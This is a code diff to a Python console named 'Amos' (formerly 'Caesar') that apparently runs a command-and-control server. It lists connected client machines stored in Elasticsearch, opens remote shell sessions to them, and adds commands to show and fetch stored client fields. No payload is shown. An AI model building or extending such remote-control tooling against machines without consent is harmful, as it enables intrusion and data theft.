@@ -34,12 +34,13 @@ class Amos:
         self.server = HTTPServer((self.ip, self.port), MyHandler)
 
 
+
     @staticmethod
     #displays caesar shell commands
     def show_commands():
         user_guide = """
             Amos Commands
-                 'guide': [Display Caesar's user commands]
+                 'guide': [Display Amos user commands]
                  'clients':['lists clients within ES index']
                  'connected':['lists all active connection within ES index']
                  'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
@@ -50,6 +51,7 @@ class Amos:
                  'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']
             """
         print(user_guide)
+
 
 
     @staticmethod
@@ -71,13 +73,21 @@ class Amos:
             if cmd == 'connected':
                 cmd = cmd.strip().lower()
                 for client_ip, client_id in http_server.RequestHandlerClass.connected_clients.items():
-                    print(f"{client_id}: {client_ip}")  
+                    print(client_id, client_ip)
+                    
+                    http_server.RequestHandlerClass.send_check_call_command(http_server.RequestHandlerClass, client_ip)
+                    
+                    
 
             elif cmd.strip() == "":
                 pass 
 
             elif cmd.startswith('shell'):
+
                 client_ip = cmd.split(' ')[1]
+                #ip = http_server.RequestHandlerClass.get_client_ip(http_server.RequestHandlerClass, "5CvAcIoB-yjI_UK4Pk2W", self.esHandler)
+                #print(ip)
+
                 if client_ip in http_server.RequestHandlerClass.connected_clients:
                     http_server.RequestHandlerClass.selected_client_ip = client_ip
                     http_server.RequestHandlerClass.continuous_communication(http_server.RequestHandlerClass, client_ip)
@@ -89,13 +99,37 @@ class Amos:
                 cmd = cmd.strip().lower()
                 self.esHandler.retrieve_client_information()
 
+
             elif cmd.strip() == "guide":
                 cmd = cmd.strip().lower()
                 self.show_commands()
 
+
             elif cmd.rstrip() == "delete all":
                 cmd = cmd.strip().lower()
                 self.esHandler.delete_all_docs()
+
+
+            elif cmd.startswith('show fields'):
+                cmd = cmd.split()
+
+                if len(cmd) == 3:
+                    client_id = cmd[2]
+                    self.esHandler.show_fields(client_id)
+                else:
+                    print("[-]Invalid input!!!")
+
+
+            elif cmd.startswith('get fields'):
+                cmd = cmd.split()
+
+                if len(cmd) == 4:
+                    client_id = cmd[2]
+                    feild_parameter= cmd[3]
+                    self.esHandler.get_field(client_id, feild_parameter)
+                else:
+                    print("[-]Invalid input!!!")
+
 
             elif cmd.startswith('delete'):
                 cmd = cmd.split()
@@ -103,9 +137,7 @@ class Amos:
                 if len(cmd) == 2:
                     doc_to_delete = cmd[1]
                 else:
-                    print("Invalid input!!!")
-
-                print(doc_to_delete)
+                    print("[-]Invalid input!!!")
                 self.esHandler.delete_doc(doc_to_delete)
 
             else:
@@ -125,12 +157,13 @@ class Amos:
 
 
 
-
 if __name__ == '__main__':
-    amos_server = Amos('172.20.86.181', 8080, "amos_index", "http://localhost:9200")
+    amos_server = Amos('192.168.1.192', 8080, "amos_index", "http://localhost:9200")
     amos_server.show_commands()
     amos_server.start()
    
 
-    
-    
+
+
+
+
